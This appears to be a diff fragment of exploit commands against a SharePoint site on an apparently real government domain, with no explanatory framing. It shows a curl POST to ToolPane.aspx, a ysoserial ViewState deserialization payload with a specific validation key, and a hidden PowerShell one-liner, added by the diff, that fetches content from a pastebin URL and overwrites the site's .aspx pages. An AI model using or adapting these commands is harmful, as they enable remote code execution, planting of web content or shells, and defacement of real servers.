@@ -2,3 +2,6 @@ curl -v -k -X POST "https://www.msj.go.cr/_layouts/15/ToolPane.aspx?DisplayMode=
 
 
 ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell --ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command (Invoke-WebRequest https://pastebin.com/raw/Xih9xGK8).Content | Out-File -FilePath C:\inetpub\wwwroot\Paginas\default.aspx -Encoding utf8" --generator="095EA52E" --validationkey="FAA45BC66E06323C48961DA2AEAF077D8786291E2748330F03B6601F08523B79" --validationalg="HMACSHA256" --islegacy --minify
+
+
+powershell --ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command (Invoke-WebRequest https://pastebin.com/raw/Xih9xGK8).Content | Out-File -FilePath C:\inetpub\wwwroot\default_page.aspx -Encoding utf8
